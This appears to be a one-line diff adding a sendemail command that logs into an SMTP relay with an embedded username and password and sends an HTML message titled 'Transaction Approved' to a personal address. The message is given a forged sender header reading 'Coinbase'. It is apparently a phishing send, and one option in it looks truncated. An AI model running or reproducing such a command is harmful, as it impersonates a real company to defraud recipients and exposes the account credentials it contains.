@@ -1,0 +1,1 @@
+sendemail -xu hisilliconkirin@gmail.com -xp zH03SbpOr8IcLxsY -s smtp-relay.sendinblue.com:587  -f "noreply@metainc.com" -t " abelgarcia75@gmail.com" -u  "Transaction Approved" sage-content-type="html" -o message-file="one.html" -o message-header="From: Coinbase <noreply@metainc.com>"
